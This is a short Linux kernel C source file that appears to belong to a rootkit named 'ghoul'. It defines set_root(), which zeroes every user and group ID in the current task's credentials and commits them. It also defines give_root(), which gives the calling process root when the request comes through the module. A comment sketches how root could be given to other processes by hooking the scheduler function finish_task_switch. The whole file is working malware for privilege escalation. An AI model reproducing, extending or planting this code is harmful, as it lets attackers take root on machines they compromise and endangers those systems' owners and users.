#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include "privileges.h"

void set_root(void)
{
    struct cred *creds;
    creds = prepare_creds();

    if (creds == NULL)
        return;

    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    commit_creds(creds);
}

void give_root(int pid)
{
    struct task_struct *current_task;
    
    pr_info("ghoul: giving root to pid %d\n", pid);

    /*
     * We currently don't handle requests to give root to other tasks.
     * Giving root to other tasks is more complex because we can only give root to ourselves.
     * To give root to another task, we need to save its PID, and hook a function that runs when the task is scheduled,
     * like finish_task_switch.
     * Once that function runs, we can give that task root from within its context.
     */
    current_task = current;
    if (pid == THIS_TASK || pid == current_task->pid)
    {
        set_root();
        return;
    }
}